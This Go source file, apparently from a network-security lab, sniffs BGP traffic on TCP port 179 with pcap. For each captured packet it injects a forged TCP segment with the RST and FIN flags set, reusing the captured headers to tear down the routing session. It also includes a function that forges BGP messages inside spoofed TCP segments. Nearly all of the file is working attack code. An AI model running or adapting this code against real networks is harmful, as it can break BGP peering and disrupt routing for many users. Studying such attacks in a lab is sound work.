package lab1

import (
	"fmt"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcap"
	"github.com/osrg/gobgp/pkg/packet/bgp"
)

var BGPMessageLayerType = gopacket.RegisterLayerType(
	2002,
	gopacket.LayerTypeMetadata{
		Name:    "BGP",
		Decoder: gopacket.DecodeFunc(decodeBGPMessage),
	})

func decodeBGPMessage(data []byte, p gopacket.PacketBuilder) error {
	bgp := &BGPMessage{}

	err := bgp.DecodeFromBytes(data, p)

	if err != nil {
		return err
	}

	p.AddLayer(bgp)
	p.SetApplicationLayer(bgp)

	return nil
}

func (b *BGPMessage) LayerType() gopacket.LayerType {
	return BGPMessageLayerType
}

func (d *BGPMessage) Payload() []byte {
	return nil
}

func (d *BGPMessage) CanDecode() gopacket.LayerClass {
	return BGPMessageLayerType
}

func (d *BGPMessage) NextLayerType() gopacket.LayerType {
	return gopacket.LayerTypePayload
}

func (b *BGPMessage) LayerContents() []byte {
	s, _ := b.Serialize()

	return s
}

func (l *BGPMessage) LayerPayload() []byte {
	return nil
}

type BGPMessage struct {
	bgp.BGPMessage
}

const (
	BGP_HEADER_LENGTH      = 19
	BGP_MAX_MESSAGE_LENGTH = 4096
)

func (msg *BGPMessage) DecodeFromBytes(data []byte, df gopacket.DecodeFeedback) error {
	bgp, err := bgp.ParseBGPMessage(data)

	if err != nil {
		return err
	}

	msg.Header = bgp.Header
	msg.Body = bgp.Body

	return nil
}

func Listen(handle *pcap.Handle) {
	var eth layers.Ethernet
	var ip4 layers.IPv4
	var ip6 layers.IPv6
	var tcp layers.TCP
	var bgppkt BGPMessage

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ip4, &ip6, &tcp, &bgppkt)

	decodedLayers := make([]gopacket.LayerType, 0, 10)

	for {
		data, _, err := handle.ReadPacketData()
		if err != nil {
			fmt.Printf("Error reading packet data: %v \n", err)
			continue
		}

		err = parser.DecodeLayers(data, &decodedLayers)

		if err != nil {
			fmt.Printf("Error: %s \n", err)
		}

		err = ResetSession(&eth, &ip6, &tcp, handle)

		fmt.Println("Sending bad packet...")

		if err != nil {
			fmt.Printf("Error: %s \n", err)
		}
	}
}

func Setup() {
	layers.RegisterTCPPortLayerType(179, BGPMessageLayerType)
}

func ResetSession(eth *layers.Ethernet, ip *layers.IPv6, tcp *layers.TCP, handle *pcap.Handle) error {

	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	tcp.SYN = false
	tcp.FIN = true
	tcp.RST = true
	tcp.PSH = true

	tcp.SetNetworkLayerForChecksum(ip)

	buffer := gopacket.NewSerializeBuffer()

	err := gopacket.SerializeLayers(buffer, options,
		eth,
		ip,
		tcp,
	)

	if err != nil {
		return err
	}

	outgoingPacket := buffer.Bytes()

	// Send our packet
	return handle.WritePacketData(outgoingPacket)
}

func SendBGPMsg(msg *bgp.BGPMessage, tcp *layers.TCP, ip *layers.IPv6, handle *pcap.Handle, eth *layers.Ethernet) error {

	data, err := msg.Serialize()

	if err != nil {
		return err
	}

	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	tcp.SYN = false
	tcp.ACK = true
	tcp.PSH = true

	tcp.SetNetworkLayerForChecksum(ip)

	buffer := gopacket.NewSerializeBuffer()

	err = gopacket.SerializeLayers(buffer, options,
		eth,
		ip,
		tcp,
		gopacket.Payload(data),
	)

	if err != nil {
		return err
	}

	outgoingPacket := buffer.Bytes()

	fmt.Println("sending keep alive")

	// Send our packet
	return handle.WritePacketData(outgoingPacket)
}
